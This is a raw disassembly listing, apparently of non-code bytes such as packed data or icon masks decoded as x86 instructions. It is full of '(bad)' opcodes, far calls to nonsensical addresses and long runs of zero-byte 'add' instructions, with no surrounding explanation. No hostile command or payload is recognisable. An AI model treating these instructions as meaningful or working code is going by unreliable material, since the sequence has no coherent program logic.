  42d988:	lods   al,BYTE PTR ds:[esi]
  42d989:	outs   dx,DWORD PTR ds:[esi]
  42d98a:	inc    edi
  42d98b:	push   DWORD PTR [edx+eiz*4-0x51520097]
  42d992:	imul   edi,edi,0xffffffa0
  42d995:	call   0xff64:0xbd70ff5c
  42d99c:	inc    edi
  42d99d:	loope  0x42d91f
  42d99f:	call   FWORD PTR [esi-0x20]
  42d9a2:	cmp    bh,0x66
  42d9a5:	mov    bl,0x5f
  42d9a7:	cli    
  42d9a8:	adc    DWORD PTR [eax+0x2b],0x3d
	...
  42d9e3:	add    BYTE PTR [esi+0x41a94783],dl
  42d9e9:	(bad)  
  42d9ea:	cmp    al,0xfd
  42d9ec:	xor    ecx,edx
  42d9ee:	inc    esi
  42d9ef:	push   DWORD PTR [esi]
  42d9f1:	int    0x48
  42d9f3:	(bad)  
  42d9f4:	cmp    cl,bl
  42d9f6:	dec    esp
  42d9f7:	(bad)  
  42d9f8:	cmp    cl,dh
  42d9fa:	pop    ebp
  42d9fb:	call   DWORD PTR [edi-0x3d00873c]
  42da01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42da02:	pop    eax
  42da03:	inc    ebp
  42da05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42da06:	dec    esp
  42da07:	(bad)  
  42da08:	mov    esi,0x70ff7dc5
  42da0d:	jmp    0x42d9cd
  42da0f:	call   FWORD PTR [esi-0x4400491b]
  42da15:	fisub  WORD PTR [ebp+0x6ebac4ff]
  42da1b:	dec    esi
  42da1d:	mov    al,0x48
  42da1f:	dec    esp
  42da21:	scas   al,BYTE PTR es:[edi]
  42da22:	dec    edx
  42da23:	inc    ebx
  42da25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42da26:	push   ecx
  42da27:	inc    esp
  42da29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42da2a:	pop    ecx
  42da2b:	(bad)  
  42da2c:	mov    ebx,0xe0ff4a95
  42da31:	mov    edi,0xc5e7ff57
  42da36:	pusha  
  42da37:	jmp    esp
  42da39:	shl    BYTE PTR [ebx-0x1],0xe1
  42da3d:	mov    edx,0xb2deff62
  42da42:	pusha  
  42da43:	dec    esp
  42da45:	xchg   esi,eax
  42da46:	push   esi
  42da47:	push   DWORD PTR [ecx-0x4a00ac7c]
  42da4d:	mov    al,0x73
  42da4f:	push   DWORD PTR [esi+edx*4+0x7ca8ff66]
  42da56:	push   edx
  42da57:	jmp    FWORD PTR [ebp-0x42]
  42da5a:	popa   
  42da5b:	dec    DWORD PTR [edi-0x23]
  42da5e:	jbe    0x42da5f
  42da60:	imul   edi,DWORD PTR [esp+ebp*2+0x366184fa],0x54
	...
  42daa7:	add    BYTE PTR [ebx+0x489f4b91],dl
  42daad:	lds    eax,FWORD PTR [ebx-0x7]
  42dab0:	fmul   DWORD PTR ss:[edi+edi*8+0x3d]
  42dab5:	fistp  WORD PTR [edi+edi*8+0x41]
  42dab9:	(bad)  [edi-0x1]
  42dabc:	call   0x4f9a:0xbbff78bf
  42dac3:	inc    esp
  42dac5:	mov    ds:0xa8c4ff48,al
  42daca:	pop    ecx
  42dacb:	push   DWORD PTR [edx-0x3c007133]
  42dad1:	leave  
  42dad2:	mov    edi,edi
  42dad4:	sar    BYTE PTR [ecx-0x553d0094],0x5d
  42dadb:	inc    esi
  42dadd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dade:	inc    edi
  42dadf:	(bad)  
  42dae0:	mov    edi,0xdaff4fa1
  42dae5:	frstor [eax-0x3d192001]
  42daeb:	inc    ecx
  42daed:	call   0xff4b:0xa0c9ff52
  42daf4:	lds    ebx,FWORD PTR [edx-0x643b00b6]
  42dafa:	push   ebx
  42dafb:	inc    ecx
  42dafd:	xchg   ebp,eax
  42dafe:	push   edx
  42daff:	dec    esp
  42db01:	fwait
  42db02:	push   ebx
  42db03:	call   ecx
  42db05:	sahf   
  42db06:	push   esi
  42db07:	(bad)  
  42db08:	mov    ebx,0xbbff5b93
  42db0d:	xchg   ebx,eax
  42db0e:	pop    ebp
  42db0f:	(bad)  
  42db10:	mov    edx,0xadff5584
  42db15:	ja     0x42db5f
  42db17:	dec    DWORD PTR [esi+esi*4-0x499c009c]
  42db1e:	popa   
  42db1f:	cmc    
  42db20:	test   BYTE PTR [esi+0x3d],ch
  42db23:	dec    ecx
	...
  42db6c:	(bad)  
  42db6d:	xchg   ebp,eax
  42db6e:	dec    ebx
  42db6f:	sbb    BYTE PTR [esp+eax*8+0x49],0xee
  42db74:	xor    eax,0x38ff43ce
  42db79:	rcl    DWORD PTR [edi-0x1],1
  42db7c:	dec    edx
  42db7d:	(bad)  
  42db7e:	je     0x42db7f
  42db80:	xchg   BYTE PTR [esi-0x5258009a],dh
  42db86:	(bad)  
  42db87:	push   DWORD PTR [ebx+esi*4-0x4d410097]
  42db8e:	push   DWORD PTR [di-0x7e39]
  42db93:	dec    DWORD PTR [esi-0x3b005e22]
  42db99:	(bad)  [edi+edi*8-0x9c5335]
  42dba0:	int3   
  42dba1:	mov    esi,0xf4e1ff75
  42dba6:	jmp    0xf235c9aa
  42dbab:	call   ebp
  42dbad:	mov    bh,0x7b
  42dbaf:	jmp    FWORD PTR [edi-0x3a00bd7e]
  42dbb5:	sahf   
  42dbb6:	push   esi
  42dbb7:	push   DWORD PTR [edx-0x47009856]
  42dbbd:	popf   
  42dbbe:	popa   
  42dbbf:	dec    edx
  42dbc1:	xchg   ebp,eax
  42dbc2:	push   ebp
  42dbc3:	(bad)  
  42dbc4:	mov    esp,0xa9ff4782
  42dbc9:	jae    0x42dc11
  42dbcb:	(bad)  
  42dbcc:	mov    ebp,0xb3ff70ab
  42dbd1:	mov    ch,0x72
  42dbd3:	jmp    FWORD PTR [esi-0x6c00a45e]
  42dbd9:	mov    ds:0x959adc59,eax
  42dbde:	pop    ecx
  42dbdf:	xor    eax,0x0
	...
  42dc30:	lea    ecx,[ebx-0x4e93cdb8]
  42dc36:	inc    edi
  42dc37:	int3   
  42dc38:	dec    edi
  42dc39:	ret    
  42dc3a:	dec    eax
  42dc3b:	std    
  42dc3c:	inc    edx
  42dc3d:	rcr    BYTE PTR [ebx-0x1],cl
  42dc40:	cmp    bl,cl
  42dc42:	ins    DWORD PTR es:[edi],dx
  42dc43:	dec    DWORD PTR [edx+edx*8+0x7b]
  42dc47:	call   FWORD PTR [esi-0x27]
  42dc4a:	xchg   ecx,eax
  42dc4b:	push   DWORD PTR [edi-0x27]
  42dc4e:	xchg   edi,eax
  42dc4f:	push   DWORD PTR [eax-0x23]
  42dc52:	cdq    
  42dc53:	push   DWORD PTR [ecx+eiz*8-0x58]
  42dc57:	push   DWORD PTR [edi-0x2a003316]
  42dc5d:	rol    BYTE PTR [ebx+0x75b6caff],0xff
  42dc64:	fucomi st,st(2)
  42dc66:	(bad)  
  42dc68:	jecxz  0x42dc56
  42dc6a:	jmp    0xc9ff:0xd9e8e0ff
  42dc71:	stos   DWORD PTR es:[edi],eax
  42dc72:	je     0x42dc73
  42dc74:	ret    0x5e9a
  42dc77:	push   DWORD PTR [ebp-0x4400975d]
  42dc7d:	xchg   esp,eax
  42dc7e:	pop    esp
  42dc7f:	(bad)  
  42dc80:	mov    eax,0xaaff487e
  42dc85:	jb     0x42dccb
  42dc87:	push   DWORD PTR [edi-0x5a008f54]
  42dc8d:	loopne 0x42dc2f
  42dc8f:	jmp    DWORD PTR [ecx-0x6009954d]
  42dc95:	xchg   ebp,eax
  42dc96:	push   edx
  42dc97:	xchg   edx,eax
  42dc98:	cwde   
  42dc99:	mov    al,ds:0xc55
	...
  42dcf6:	add    BYTE PTR [eax],al
  42dcf8:	jl     0x42dc9a
  42dcfa:	inc    esi
  42dcfb:	jo     0x42dd73
  42dcfd:	mov    ah,0x53
  42dcff:	loope  0x42dc83
  42dd01:	mov    eax,0xd15efe69
  42dd06:	jne    0x42dd07
  42dd08:	mov    edx,esp
  42dd0a:	stos   DWORD PTR es:[edi],eax
  42dd0b:	call   FWORD PTR [edi+ebx*8-0x2a6d0047]
  42dd12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dd13:	(bad)  
  42dd14:	mov    edi,0xc2ff86bd
  42dd19:	stos   DWORD PTR es:[edi],eax
  42dd1a:	jo     0x42dd1b
  42dd1c:	mov    ebp,0xc5ff5d9e
  42dd21:	mov    edi,0xe4daff8d
  42dd26:	(bad)  
  42dd28:	ftst   
  42dd2a:	fdiv   st(7),st
  42dd2c:	fldl2e 
  42dd2e:	loope  0x42dd2f
  42dd30:	into   
  42dd31:	mov    ch,0x8b
  42dd33:	(bad)  
  42dd34:	mov    esp,0xc0ff588c
  42dd39:	mov    BYTE PTR [edi-0x1],cl
  42dd3c:	rol    BYTE PTR [esi-0x774300b2],0x51
  42dd43:	jmp    DWORD PTR [ebp-0x6800a05e]
  42dd49:	fisttp DWORD PTR [edi+0x5fa89cfe]
  42dd4f:	mov    esi,0x285391a4
	...
  42ddc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ddc1:	or     DWORD PTR [edi+0x5f],0xffffffa9
  42ddc5:	xchg   ebp,eax
  42ddc6:	pusha  
  42ddc7:	(bad)  
  42ddc8:	mov    eax,0xc6f595c4
  42ddcd:	fistp  QWORD PTR [edi-0x43234401]
  42ddd3:	(bad)  
  42ddd4:	mov    esi,0xbdff9ec5
  42ddd9:	mov    dl,0x89
  42dddb:	inc    eax
  42dddd:	les    esp,FWORD PTR [edx-0x39273501]
  42dde3:	dec    esi
  42dde5:	(bad)  
  42dde6:	(bad)  
  42dde7:	dec    ebx
  42dde9:	int    0xbb
  42ddeb:	inc    ebp
  42dded:	stos   DWORD PTR es:[edi],eax
  42ddee:	test   bh,bh
  42ddf0:	mov    dl,0x81
  42ddf2:	push   ebx
  42ddf3:	push   DWORD PTR [esi-0x2c00b480]
  42ddf9:	fwait
  42ddfa:	pop    edx
  42ddfb:	dec    edi
  42ddfd:	cwde   
  42ddfe:	pop    ecx
  42ddff:	sti    
  42de00:	mov    edi,0xa1d75a91
  42de05:	popf   
  42de06:	pop    esi
  42de07:	mov    al,ds:0x32559a95
	...
  42de88:	mov    ds:0xa70b5e9b,eax
  42de8d:	lods   eax,DWORD PTR ds:[esi]
  42de8e:	jb     0x42def9
  42de90:	mov    dl,0xbe
  42de92:	mov    BYTE PTR [edi+esi*4-0x46216637],dh
  42de99:	shl    DWORD PTR [ebp-0x4b253f0d],1
  42de9f:	sti    
  42dea0:	enter  0xbadb,0xfe
  42dea4:	int    0xcc
  42dea6:	stos   BYTE PTR es:[edi],al
  42dea7:	inc    ebx
  42dea9:	mov    edx,0x9abefe8d
  42deae:	data16 hlt 
  42deb0:	ror    BYTE PTR [ebp-0x6b312aa8],0x5b
  42deb7:	pushf  
  42deb8:	rcl    DWORD PTR [ebx-0x70329fa6],1
  42debe:	pop    ecx
  42debf:	and    bl,cl
  42dec1:	test   al,0x6d
  42dec3:	add    al,BYTE PTR [eax]
	...
  42dfc5:	add    BYTE PTR [eax],al
  42dfc7:	add    bh,bh
  42dfc9:	lock add BYTE PTR [eax],al
  42dfcc:	add    BYTE PTR [edi],bh
  42dfce:	add    BYTE PTR [eax],al
  42dfd0:	inc    eax
  42dfd2:	add    BYTE PTR [eax],al
  42dfd4:	add    BYTE PTR [edi],cl
  42dfd6:	add    BYTE PTR [eax],al
  42dfd8:	inc    DWORD PTR [eax]
  42dfda:	add    BYTE PTR [eax],al
  42dfdc:	add    BYTE PTR [ebx],al
  42dfde:	add    BYTE PTR [eax],al
  42dfe0:	inc    DWORD PTR [eax]
  42dfe2:	add    BYTE PTR [eax],al
  42dfe4:	add    BYTE PTR [ebx],al
  42dfe6:	add    BYTE PTR [eax],al
  42dfe8:	inc    DWORD PTR [eax]
  42dfea:	add    BYTE PTR [eax],al
  42dfec:	add    BYTE PTR [ecx],al
  42dfee:	add    BYTE PTR [eax],al
  42dff0:	inc    BYTE PTR [eax]
  42dff2:	add    BYTE PTR [eax],al
  42dff4:	add    BYTE PTR [ecx],al
  42dff6:	add    BYTE PTR [eax],al
  42dff8:	inc    DWORD PTR [eax]
  42dffa:	add    BYTE PTR [eax],al
  42dffc:	add    BYTE PTR [ebx],al
  42dffe:	add    BYTE PTR [eax],al
  42e000:	inc    DWORD PTR [eax]
  42e002:	add    BYTE PTR [eax],al
  42e004:	add    BYTE PTR [ebx],al
  42e006:	add    BYTE PTR [eax],al
  42e008:	inc    BYTE PTR [eax]
  42e00a:	add    BYTE PTR [eax],al
  42e00c:	add    BYTE PTR [edi],al
  42e00e:	add    BYTE PTR [eax],al
  42e010:	cld    
  42e011:	add    BYTE PTR [eax],al
  42e013:	add    BYTE PTR [eax],al
  42e015:	pop    ds
  42e016:	add    BYTE PTR [eax],al
  42e018:	clc    
  42e019:	add    BYTE PTR [eax],al
  42e01b:	add    BYTE PTR [eax],al
  42e01d:	aas    
  42e01e:	add    BYTE PTR [eax],al
  42e020:	lock add BYTE PTR [eax],al
  42e023:	add    BYTE PTR [eax],al
  42e025:	pop    ds
  42e026:	add    BYTE PTR [eax],al
  42e028:	lock add BYTE PTR [eax],al
  42e02b:	add    BYTE PTR [eax],al
  42e02d:	pop    ds
  42e02e:	add    BYTE PTR [eax],al
  42e030:	loopne 0x42e032
  42e032:	add    BYTE PTR [eax],al
  42e034:	add    BYTE PTR [edi],cl
  42e036:	add    BYTE PTR [eax],al
  42e038:	loopne 0x42e03a
  42e03a:	add    BYTE PTR [eax],al
  42e03c:	add    BYTE PTR [edi],cl
  42e03e:	add    BYTE PTR [eax],al
  42e040:	rol    BYTE PTR [eax],0x0
  42e043:	add    BYTE PTR [eax],al
  42e045:	pop    es
  42e046:	add    BYTE PTR [eax],al
  42e048:	rol    BYTE PTR [eax],0x0
  42e04b:	add    BYTE PTR [eax],al
  42e04d:	pop    es
  42e04e:	add    BYTE PTR [eax],al
  42e050:	add    BYTE PTR [eax],0x0
  42e053:	add    BYTE PTR [eax],al
  42e055:	pop    es
  42e056:	add    BYTE PTR [eax],al
  42e058:	add    BYTE PTR [eax],0x0
  42e05b:	add    BYTE PTR [eax],al
  42e05d:	add    eax,DWORD PTR [eax]
  42e05f:	add    BYTE PTR [eax+0x0],al
  42e065:	add    eax,DWORD PTR [eax]
  42e067:	add    BYTE PTR [eax+0x0],al
  42e06d:	add    eax,DWORD PTR [eax]
  42e06f:	add    BYTE PTR [eax+0x0],al
  42e075:	add    eax,DWORD PTR [eax]
  42e077:	add    BYTE PTR [eax+0x0],al
  42e07d:	add    eax,DWORD PTR [eax]
  42e07f:	add    BYTE PTR [eax+0x0],al
  42e085:	add    eax,DWORD PTR [eax]
  42e087:	add    BYTE PTR [eax+0x0],al
  42e08d:	add    eax,DWORD PTR [eax]
  42e08f:	add    BYTE PTR [eax+0x0],al
  42e095:	add    eax,DWORD PTR [eax]
  42e097:	add    BYTE PTR [eax+0x0],al
  42e09d:	add    eax,DWORD PTR [eax]
  42e09f:	add    BYTE PTR [eax+0x0],al
  42e0a5:	add    eax,DWORD PTR [eax]
  42e0a7:	add    BYTE PTR [eax+0x0],al
  42e0ad:	add    eax,DWORD PTR [eax]
  42e0af:	add    BYTE PTR [eax+0x0],al
  42e0b5:	add    eax,DWORD PTR [eax]
  42e0b7:	add    BYTE PTR [eax+0x0],al
  42e0bd:	add    eax,DWORD PTR [eax]
  42e0bf:	add    BYTE PTR [eax+0x0],al
  42e0c5:	pop    es
  42e0c6:	add    BYTE PTR [eax],al
  42e0c8:	rol    BYTE PTR [eax],0x0
  42e0cb:	add    BYTE PTR [eax],al
  42e0cd:	pop    es
  42e0ce:	add    BYTE PTR [eax],al
  42e0d0:	rol    BYTE PTR [eax],0x0
  42e0d3:	add    BYTE PTR [eax],al
  42e0d5:	pop    es
  42e0d6:	add    BYTE PTR [eax],al
  42e0d8:	loopne 0x42e0da
  42e0da:	add    BYTE PTR [eax],al
  42e0dc:	add    BYTE PTR [edi],cl
  42e0de:	add    BYTE PTR [eax],al
  42e0e0:	loopne 0x42e0e2
  42e0e2:	add    BYTE PTR [eax],al
  42e0e4:	add    BYTE PTR [edi],cl
  42e0e6:	add    BYTE PTR [eax],al
  42e0e8:	lock add BYTE PTR [eax],al
  42e0eb:	add    BYTE PTR [eax],al
  42e0ed:	pop    ds
  42e0ee:	add    BYTE PTR [eax],al
  42e0f0:	lock add BYTE PTR [eax],al
  42e0f3:	add    BYTE PTR [eax],al
  42e0f5:	pop    ds
  42e0f6:	add    BYTE PTR [eax],al
  42e0f8:	clc    
  42e0f9:	add    BYTE PTR [eax],al
  42e0fb:	add    BYTE PTR [eax],al
  42e0fd:	aas    
  42e0fe:	add    BYTE PTR [eax],al
  42e100:	cld    
  42e101:	add    BYTE PTR [eax],al
  42e103:	add    BYTE PTR [eax],al
  42e105:	jg     0x42e107
  42e107:	add    dh,bh
  42e109:	add    BYTE PTR [eax],al
  42e10b:	add    BYTE PTR [eax],al
  42e10d:	inc    DWORD PTR [eax]
  42e10f:	add    bh,bh
  42e111:	add    BYTE PTR [eax],al
  42e113:	add    BYTE PTR [ecx],al
  42e115:	inc    DWORD PTR [eax]
  42e117:	add    bh,bh
  42e119:	add    BYTE PTR [eax],0x0
  42e11c:	add    edi,edi
  42e11e:	add    BYTE PTR [eax],al
  42e120:	inc    eax
  42e122:	add    BYTE PTR [eax],al
  42e124:	pop    es
  42e125:	inc    DWORD PTR [eax]
  42e127:	add    bh,bh
  42e129:	lock add BYTE PTR [eax],al
  42e12c:	pop    ds
  42e12d:	inc    DWORD PTR [eax]
  42e12f:	add    bh,bh
  42e131:	cld    
  42e132:	add    BYTE PTR [eax],al
  42e134:	jg     0x42e135
  42e136:	add    BYTE PTR [eax],al
  42e138:	(bad)  
  42e139:	inc    DWORD PTR [eax]
  42e13b:	add    edi,edi
  42e13d:	inc    DWORD PTR [eax]
  42e13f:	add    bh,bh
  42e141:	(bad)  
  42e142:	(bad)  
  42e143:	(bad)  
  42e144:	(bad)  
  42e145:	inc    DWORD PTR [eax]
  42e147:	add    BYTE PTR [eax],ch
  42e149:	add    BYTE PTR [eax],al
  42e14b:	add    BYTE PTR [eax],ah
  42e14d:	add    BYTE PTR [eax],al
  42e14f:	add    BYTE PTR [eax+0x0],al
  42e152:	add    BYTE PTR [eax],al
  42e154:	add    DWORD PTR [eax],eax
  42e156:	and    BYTE PTR [eax],al
  42e158:	add    BYTE PTR [eax],al
  42e15a:	add    BYTE PTR [eax],al
  42e15c:	adc    BYTE PTR [eax],0x0
	...
  42e197:	add    DWORD PTR [eax],eax
  42e199:	add    BYTE PTR [eax],al
  42e19b:	add    eax,0xd000000
  42e1a0:	add    BYTE PTR [eax],al
  42e1a2:	add    BYTE PTR [edi],dl
  42e1a4:	add    BYTE PTR [eax],al
  42e1a6:	add    BYTE PTR [ecx],ah
  42e1a8:	add    BYTE PTR [eax],al
  42e1aa:	add    BYTE PTR [ecx],ch
  42e1ac:	add    BYTE PTR [eax],al
  42e1ae:	add    BYTE PTR [esi],ch
  42e1b0:	add    BYTE PTR [eax],al
  42e1b2:	add    BYTE PTR [edi],ch
  42e1b4:	add    BYTE PTR [eax],al
  42e1b6:	add    BYTE PTR [eax+eax*1],ch
  42e1b9:	add    BYTE PTR [eax],al
  42e1bb:	sub    BYTE PTR [eax],al
  42e1bd:	add    BYTE PTR [eax],al
  42e1bf:	and    al,BYTE PTR [eax]
  42e1c1:	add    BYTE PTR [eax],al
  42e1c3:	sbb    eax,0x16000000
  42e1c8:	add    BYTE PTR [eax],al
  42e1ca:	add    BYTE PTR [edi],cl
  42e1cc:	add    BYTE PTR [eax],al
  42e1ce:	add    BYTE PTR [edx],cl
  42e1d0:	add    BYTE PTR [eax],al
  42e1d2:	add    BYTE PTR ds:0x2000000,al
	...
  42e20c:	add    BYTE PTR [eax],al
  42e20e:	add    BYTE PTR ds:0x14000000,al
  42e214:	add    BYTE PTR [eax],al
  42e216:	add    BYTE PTR ds:0x49000000,ch
  42e21c:	add    BYTE PTR [eax],al
  42e21e:	add    BYTE PTR [ecx+0x0],ch
  42e221:	add    BYTE PTR [eax],al
  42e223:	test   BYTE PTR [eax],al
  42e225:	add    BYTE PTR [eax],al
  42e227:	xchg   edi,eax
  42e228:	add    BYTE PTR [eax],al
  42e22a:	add    BYTE PTR [ecx-0x5e000000],ah
  42e230:	add    BYTE PTR [eax],al
  42e232:	add    BYTE PTR [ebx-0x71000000],bl
  42e238:	add    BYTE PTR [eax],al
  42e23a:	add    BYTE PTR [eax+0x6f000000],al
  42e240:	add    BYTE PTR [eax],al
  42e242:	add    BYTE PTR [ecx+0x0],ah
  42e245:	add    BYTE PTR [eax],al
  42e247:	push   edx
  42e248:	add    BYTE PTR [eax],al
  42e24a:	add    BYTE PTR [ebx+0x0],al
  42e24d:	add    BYTE PTR [eax],al
  42e24f:	xor    al,0x0
  42e251:	add    BYTE PTR [eax],al
  42e253:	daa    
  42e254:	add    BYTE PTR [eax],al
  42e256:	add    BYTE PTR [ecx],bl
  42e258:	add    BYTE PTR [eax],al
  42e25a:	add    BYTE PTR [esi],cl
  42e25c:	add    BYTE PTR [eax],al
  42e25e:	add    BYTE PTR [esi],al
  42e260:	add    BYTE PTR [eax],al
  42e262:	add    BYTE PTR [ecx],al
	...
  42e284:	add    BYTE PTR [eax],al
  42e286:	add    BYTE PTR [ecx],al
  42e288:	add    BYTE PTR [eax],al
  42e28a:	add    BYTE PTR [eax],dl
  42e28c:	add    BYTE PTR [eax],al
  42e28e:	add    BYTE PTR [edx],dh
  42e290:	add    BYTE PTR [eax],al
  42e292:	add    BYTE PTR [edi+0x0],bl
  42e295:	add    BYTE PTR [eax],al
  42e297:	xchg   DWORD PTR [ecx],edx
  42e299:	or     al,BYTE PTR ds:0x152939b5
  42e29f:	in     al,0x52
  42e2a1:	inc    ebp
  42e2a2:	and    dh,bh
  42e2a4:	jp     0x42e304
  42e2a6:	aaa    
  42e2a7:	cld    
  42e2a8:	call   0x4c72:0xabfd476c
  42e2af:	std    
  42e2b0:	mov    cl,0x79
  42e2b2:	dec    edi
  42e2b3:	cld    
  42e2b4:	test   eax,0x8af24870
  42e2b9:	pop    edx
  42e2ba:	cmp    ch,bl
  42e2bc:	pop    ebx
  42e2bd:	cmp    DWORD PTR [ebx],esp
  42e2bf:	mov    ah,0x16
  42e2c1:	invd   
  42e2c3:	test   DWORD PTR [eax],eax
  42e2c5:	add    BYTE PTR [eax],al
  42e2c7:	outs   dx,DWORD PTR ds:[esi]
  42e2c8:	add    BYTE PTR [eax],al
  42e2ca:	add    BYTE PTR [edx+0x0],ah
  42e2cd:	add    BYTE PTR [eax],al
  42e2cf:	push   esp
  42e2d0:	add    BYTE PTR [eax],al
  42e2d2:	add    BYTE PTR [eax+0x0],cl
  42e2d5:	add    BYTE PTR [eax],al
  42e2d7:	cmp    al,BYTE PTR [eax]
  42e2d9:	add    BYTE PTR [eax],al
  42e2db:	sub    eax,0x1f000000
  42e2e0:	add    BYTE PTR [eax],al
  42e2e2:	add    BYTE PTR [edi],cl
  42e2e4:	add    BYTE PTR [eax],al
  42e2e6:	add    BYTE PTR [eax+eax*1],al
	...
  42e305:	add    BYTE PTR [eax],al
  42e307:	pop    es
  42e308:	add    BYTE PTR [eax],al
  42e30a:	add    BYTE PTR [edx],dh
  42e30c:	add    BYTE PTR [eax],al
  42e30e:	add    BYTE PTR [eax+0x29],ch
  42e311:	adc    cl,BYTE PTR [edi]
  42e313:	mov    eax,ds:0xe62e4177
  42e318:	dec    ebp
  42e319:	imul   esi,DWORD PTR [ecx],0xfffffffe
  42e31c:	inc    ebx
  42e31d:	jge    0x42e354
  42e31f:	call   DWORD PTR [eax-0x75]
  42e322:	cmp    al,0xff
  42e324:	inc    esi
  42e325:	xchg   esp,eax
  42e326:	cmp    edi,edi
  42e328:	popa   
  42e329:	mov    eax,ds:0x8a9eff43
  42e32e:	dec    edi
  42e32f:	jmp    FWORD PTR [ebp-0x4100b48c]
  42e335:	test   BYTE PTR [ebp-0x1],dl
  42e338:	retf   0x5f96
  42e33b:	(bad)  
  42e33c:	fsub   DWORD PTR [edi-0x5d2c009a]
  42e342:	pusha  
  42e343:	stc    
  42e344:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e345:	jbe    0x42e38c
  42e347:	retf   0x2131
  42e34a:	adc    esi,DWORD PTR [ecx+0x0]
  42e34d:	add    BYTE PTR [eax],al
  42e34f:	push   ebp
  42e350:	add    BYTE PTR [eax],al
  42e352:	add    BYTE PTR [ebx+0x0],cl
  42e355:	add    BYTE PTR [eax],al
  42e357:	inc    edx
  42e358:	add    BYTE PTR [eax],al
  42e35a:	add    BYTE PTR [edx],bh
  42e35c:	add    BYTE PTR [eax],al
  42e35e:	add    BYTE PTR [ecx],dh
  42e360:	add    BYTE PTR [eax],al
  42e362:	add    BYTE PTR [ecx],ah
  42e364:	add    BYTE PTR [eax],al
  42e366:	add    BYTE PTR [eax+eax*1],cl
  42e369:	add    BYTE PTR [eax],al
  42e36b:	add    DWORD PTR [eax],eax
	...
  42e385:	add    BYTE PTR [eax],al
  42e387:	or     BYTE PTR [ecx],bl
  42e389:	or     eax,0x3e7f3c0c
  42e38e:	xor    dh,BYTE PTR [edi-0x3bcab5a]
  42e394:	xchg   esp,eax
  42e395:	pop    esp
  42e396:	inc    edx
  42e397:	dec    DWORD PTR [eax-0x77]
  42e39a:	aaa    
  42e39b:	call   FWORD PTR [eax-0x64]
  42e39e:	call   FWORD PTR ds:[ebx-0x5d]
  42e3a2:	inc    DWORD PTR ds:[ecx-0x5a]
  42e3a6:	cmp    bh,bh
  42e3a8:	inc    eax
  42e3a9:	scas   al,BYTE PTR es:[edi]
  42e3aa:	xor    bh,bh
  42e3ac:	push   ebp
  42e3ad:	lods   al,BYTE PTR ds:[esi]
  42e3ae:	cmp    bh,bh
  42e3b0:	mov    BYTE PTR [ebx-0x775c00b9],dl
  42e3b6:	dec    esp
  42e3b7:	jmp    FWORD PTR [edi-0x3600b888]
  42e3bd:	nop
  42e3be:	push   edi
  42e3bf:	call   edi
  42e3c1:	mov    ds:0xb0deff61,eax
  42e3c6:	imul   edi,edi,0xfb64addb
  42e3cc:	xchg   edi,eax
  42e3cd:	addr16 cmp eax,0x30709a5
  42e3d3:	dec    esp
  42e3d4:	add    BYTE PTR [eax],al
  42e3d6:	add    BYTE PTR [eax+0x0],al
  42e3d9:	add    BYTE PTR [eax],al
  42e3db:	cmp    BYTE PTR [eax],al
  42e3dd:	add    BYTE PTR [eax],al
  42e3df:	xor    BYTE PTR [eax],al
  42e3e1:	add    BYTE PTR [eax],al
  42e3e3:	and    eax,DWORD PTR [eax]
  42e3e5:	add    BYTE PTR [eax],al
  42e3e7:	or     eax,0x1000000
	...
  42e404:	stos   DWORD PTR es:[edi],eax
  42e405:	push   ebp
  42e406:	dec    edx
  42e407:	push   ds
  42e408:	lods   eax,DWORD PTR ds:[esi]
  42e409:	push   edx
  42e40a:	inc    esp
  42e40b:	mov    edi,0xff4051a2
  42e410:	xchg   esp,eax
  42e411:	dec    ecx
  42e412:	aaa    
  42e413:	(bad)  
  42e414:	jge    0x42e485
  42e416:	notrack call DWORD PTR [eax-0x62]
  42e41a:	cmp    edi,edi
  42e41c:	push   ecx
  42e41d:	xchg   esi,eax
  42e41e:	aaa    
  42e41f:	(bad)  
  42e420:	ds xchg ecx,eax
  42e422:	das    
  42e423:	push   DWORD PTR ds:0x3aff2b94
  42e429:	mov    al,ds:0xa53eff2d
  42e42e:	dec    DWORD PTR cs:[eax-0x53]
  42e432:	xor    edi,edi
  42e434:	push   esi
  42e435:	mov    cl,0x38
  42e437:	jmp    DWORD PTR [ebx-0x4800b780]
  42e43d:	jl     0x42e488
  42e43f:	dec    ebp
  42e441:	mov    ss,WORD PTR [edi+edi*8-0x2e]
  42e445:	xchg   ebp,eax
  42e446:	pop    eax
  42e447:	call   ebp
  42e449:	mov    al,ds:0xaadaff61
  42e44e:	addr16 (bad) 
  42e450:	mov    ebx,0x1ccc4d82
  42e455:	adc    al,0xb
  42e457:	inc    edx
  42e458:	add    BYTE PTR [eax],al
  42e45a:	add    BYTE PTR [esi],ch
  42e45c:	add    BYTE PTR [eax],al
  42e45e:	add    BYTE PTR [edi],bl
  42e460:	add    BYTE PTR [eax],al
  42e462:	add    BYTE PTR [eax],dl
  42e464:	add    BYTE PTR [eax],al
  42e466:	add    BYTE PTR [eax+eax*1],al
	...
  42e47d:	add    BYTE PTR [eax],al
  42e47f:	add    BYTE PTR [ebx-0x4de0bbaf],dh
  42e485:	push   edx
  42e486:	inc    ebx
  42e487:	retf   
  42e488:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e489:	push   eax
  42e48a:	aas    
  42e48b:	call   DWORD PTR [ebx+0x71ff394b]
  42e491:	jae    0x42e4ce
  42e493:	jmp    FWORD PTR [ebx]
  42e495:	mov    ah,BYTE PTR [edi]
  42e497:	push   DWORD PTR [edx]
  42e499:	and    BYTE PTR [esi],0xff
  42e49c:	das    
  42e49d:	jle    0x42e4c2
  42e49f:	jmp    DWORD PTR [ebx]
  42e4a1:	xchg   BYTE PTR [edi+edi*8],bl
  42e4a4:	and    eax,DWORD PTR [esi-0x7ada00e7]
  42e4aa:	sbb    bh,bh
  42e4ac:	sub    BYTE PTR [ebx-0x67d000e7],cl
  42e4b2:	push   ds
  42e4b3:	push   DWORD PTR [edi]
  42e4b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e4b6:	and    al,0xff
  42e4b8:	je     0x42e448
  42e4ba:	cmp    bh,bh
  42e4bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
